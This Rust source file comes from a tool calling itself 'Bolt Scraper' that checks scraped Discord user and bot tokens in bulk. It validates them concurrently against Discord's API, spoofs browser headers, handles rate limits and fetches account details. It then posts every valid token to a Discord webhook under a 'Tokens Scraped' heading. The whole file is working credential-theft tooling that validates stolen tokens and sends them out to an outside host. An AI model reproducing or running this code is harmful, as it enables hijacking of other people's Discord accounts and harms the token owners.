use serde::{Deserialize, Serialize};
use serde_json::{json, from_str, Value};
use reqwest::Client;
use tokio::time::{sleep, Duration};
use futures::{stream::futures_unordered::FuturesUnordered, StreamExt};
use itertools::Itertools;
use std::fmt;

#[derive(Clone, Debug)]
pub enum Token {
    Bot(String),
    User(String),
}

impl fmt::Display for Token {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        match self {
            Token::Bot(x) => write!(f, "{}", x),
            Token::User(x) => write!(f, "{}", x),
        }
    }
}




#[test]
fn enum_testing() {
    println!("OKwoakdoawd");
    let token = Token::Bot("Penis".to_string());
    println!("TGsetset {}", token);
}
// For discord ratelimits
#[derive(Serialize, Deserialize, Debug)]
struct Retry {
    global: bool,
    message: String,
    retry_after: f32
}


pub struct Webhook {
    url: String,
}

impl Webhook {
    pub fn new(url: &str) -> Self {
        Self { url: url.to_string() }
    }

    pub async fn send(&self, repl_url: &str, token_type: &str, tokens: Vec<Token>) {
        if tokens.is_empty() {
            return
        }
        let client = Client::new();
        let start = format!("```fix\nValid Tokens: {}\nURL: {}```", tokens.len(), repl_url);
        let mut da_str = "".to_owned();
        for token in tokens {
            da_str.push_str(&format!("{}\n", token));
            if da_str.len() > 900 {
                let second = format!("```ini\n[\n{}]```", da_str);
                let json = json!({
                    "content": "@everyone",
                    "embeds": [
                        {
                            "title": format!("{} Tokens Scraped", token_type),
                            "fields": [
                                {
                                    "name": "\u{200b}",
                                    "value": start,
                                    "inline": false
                                },
                                {
                                    "name": "**Tokens**",
                                    "value": second,
                                    "inline": true,
                                }
                            ],
                            "footer": {
                                "text": "Bolt Scraper・https://github.com/Shell1010/Bolt-scraper"
                            }
                        }
                    ]
                });
                let resp = client.post(&self.url)
                    .json(&json)
                    .send().await.unwrap();


                if resp.status().is_success() {
                    println!("\x1b[34mSent the embed!\x1b[0m");
                } else {
                    println!("Failed to send embed\nReason: {}", resp.text().await.unwrap());
                }
                da_str.clear();
                sleep(Duration::from_millis(3000)).await;
            }
        }
        if da_str.len() > 900 {}
        else {
            let second = format!("```ini\n[\n{}]```", da_str);
            let json = json!({
                "content": "@everyone",
                "embeds": [
                    {
                        "title": format!("{} Tokens Scraped", token_type),
                        "fields": [
                            {
                                "name": "\u{200b}",
                                "value": start,
                                "inline": false
                            },
                            {
                                "name": "**Tokens**",
                                "value": second,
                                "inline": true,
                            }
                        ],
                        "footer": {
                            "text": "Bolt Scraper・https://github.com/Shell1010/Bolt-scraper"
                        }
                    }
                ]
            });
            let resp = client.post(&self.url)
                .json(&json)
                .send().await.unwrap();

            if resp.status().is_success() {
                println!("\x1b[34mSent the embed!\x1b[0m");
            } else {
                println!("Failed to send embed\nReason: {}", resp.text().await.unwrap());
            }
        }
    }
}


pub async fn check_user(client: Client, token: String) -> Option<Token> {
    loop {
        let resp = client.get("https://discord.com/api/v9/users/@me/library")
            .header("authorization", token.clone())
            .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
            .header("origin", "https://discord.com")
            .header("referer", "https://discord.com")

            .send().await;
        match resp {
            Ok(resp) => {
                if resp.status().is_success() {
                    return Some(Token::User(token))
                } else if resp.status().as_str() == "429" {
                    let j = resp.json::<Retry>().await;
                    match j {
                        Ok(j) => {
                            println!("\x1b[0;91mRatelimited... Please wait {} seconds\x1b[0m", j.retry_after);
                            sleep(Duration::from_secs_f32(j.retry_after)).await;
                        },
                        Err(_) => {
                            println!("x1b[0;91mRatelimited... Sleeping for 5 seconds\x1b[0m");
                            sleep(Duration::from_secs(5)).await
                        }
                    }
                } else {
                    return None
                }
            },
            Err(_) => return None
        }
    }
}

pub async fn check_bot(client: Client, token: String) -> Option<Token> {
    loop {
        let resp = client.get("https://discord.com/api/v9/users/@me")
            .header("authorization", format!("Bot {}",token.clone()))
            .send().await;
        match resp {
            Ok(resp) => {
                if resp.status().is_success() {
                    return Some(Token::Bot(token))
                } else if resp.status().as_str() == "429" {
                    let j = resp.json::<Retry>().await;
                    match j {
                        Ok(j) => {
                            println!("\x1b[0;91mRatelimited... Please wait {} seconds\x1b[0m", j.retry_after);
                            sleep(Duration::from_secs_f32(j.retry_after)).await;
                        },
                        Err(_) => {
                            println!("x1b[0;91mRatelimited... Sleeping for 5 seconds\x1b[0m");
                            sleep(Duration::from_secs(5)).await
                        }
                    }
                } else {
                    return None
                }
            },
            Err(_) => return None

        }
    }
}

pub async fn token_information_bot(client: Client, token: String) -> Option<Value> {
    loop {
        let resp = client.get("https://discord.com/api/v9/users/@me")
            .header("authorization", format!("Bot {}",token.clone()))
            .send().await;
        match resp {
            Ok(resp) => {
                if resp.status().is_success() {
                    let text = resp.text().await.unwrap();
                    from_str(&text).unwrap()
                } else if resp.status().as_str() == "429" {
                    let j = resp.json::<Retry>().await;
                    match j {
                        Ok(j) => {
                            println!("\x1b[0;91mRatelimited... Please wait {} seconds\x1b[0m", j.retry_after);
                            sleep(Duration::from_secs_f32(j.retry_after)).await;
                        },
                        Err(_) => {
                            println!("x1b[0;91mRatelimited... Sleeping for 5 seconds\x1b[0m");
                            sleep(Duration::from_secs(5)).await
                        }
                    }
                } else {
                    return None
                }
            },
            Err(_) => return None
        }
    }
}

pub async fn token_information_user(client: Client, token: String) -> Option<Value> {
    loop {
        let resp = client.get("https://discord.com/api/v9/users/@me")
            .header("authorization", token.clone())
            .send().await;
        match resp {
            Ok(resp) => {
                if resp.status().is_success() {
                    let text = resp.text().await.unwrap();
                    from_str(&text).unwrap()
                } else if resp.status().as_str() == "429" {
                    let j = resp.json::<Retry>().await;
                    match j {
                        Ok(j) => {
                            println!("\x1b[0;91mRatelimited... Please wait {} seconds\x1b[0m", j.retry_after);
                            sleep(Duration::from_secs_f32(j.retry_after)).await;
                        },
                        Err(_) => {
                            println!("x1b[0;91mRatelimited... Sleeping for 5 seconds\x1b[0m");
                            sleep(Duration::from_secs(5)).await
                        }
                    }
                } else {
                    return None
                }
            },
            Err(_) => return None
        }
    }
}

pub struct Discord {
    tokens: Vec<String>
}

impl Discord {
    pub fn new(tokens: Vec<String>) -> Self {
        Self { tokens }
    }
    pub async fn mass_check_user(&self) -> Vec<Token> {
        let client = Client::new();
        let mut futs = FuturesUnordered::new();
        let mut tokens = self.tokens.clone().into_iter().unique().peekable();
        let mut chunk_count = 0;
        let mut tok_vec = vec!();
        while let Some(token) = tokens.next() {
            futs.push(check_user(client.clone(), token));
            chunk_count += 1;
            if tokens.peek().is_none() || chunk_count >= 100 {
                while let Some(items) = futs.next().await {
                    if let Some(item) = items {
                        tok_vec.push(item);
                    }
                }
                chunk_count = 0;
            }
        }
        tok_vec
    }

    pub async fn mass_check_bot(&self) -> Vec<Token> {
        let client = Client::new();
        let mut futs = FuturesUnordered::new();
        let mut tokens = self.tokens.clone().into_iter().unique().peekable();
        let mut chunk_count = 0;
        let mut tok_vec = vec!();
        while let Some(token) = tokens.next() {
            futs.push(check_bot(client.clone(), token));
            chunk_count += 1;
            if tokens.peek().is_none() || chunk_count >= 100 {
                while let Some(items) = futs.next().await {
                    if let Some(item) = items {
                        tok_vec.push(item);
                    }
                }
                chunk_count = 0;
            }
        }
        tok_vec
    }
}